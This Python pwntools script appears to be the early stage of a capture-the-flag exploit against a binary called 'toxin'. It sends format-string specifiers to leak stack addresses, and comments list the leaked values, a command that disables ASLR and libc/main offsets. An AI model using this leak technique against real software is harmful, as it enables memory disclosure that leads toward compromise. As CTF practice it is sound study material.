from pwn import *

#context.log_level = 'debug'

def detect():
	for i in range(20):
		io.recvuntil('>')
		io.sendline('4')
		io.recvuntil('Enter search term:')
		io.sendline('%'+str(i+1)+'$p')
		buf = io.recvline().strip().split(' ')[0]
		print str(i+1)+' : '+buf

#ip, port = 
#io = remote(ip, port)
io = process('./toxin')

#detect()

'''
echo 0 > /proc/sys/kernel/randomize_va_space

1 : 0x7fffffffe26a
2 : 0x10
3 : 0x7ffff7af4081
4 : 0x13
5 : (nil)
6 : 0x3ffffe290
7 : 0xa7024372550d0
8 : 0x7fffffffe290
9 : 0x555555555284
10 : 0x7fffffffe370
11 : 0x400000000
12 : 0x5555555556d0
13 : 0x7ffff7a05b97
14 : 0x1
15 : 0x7fffffffe378
16 : 0x10000c000
17 : 0x5555555551b5
18 : (nil)
19 : 0xe618444d10ca1f98
20 : 0x5555555550d0


pwndbg> disassemble 0x7ffff7a05b97
Dump of assembler code for function __libc_start_main:

>>> hex(elf.sym['main'])
'0x11b5'

'''


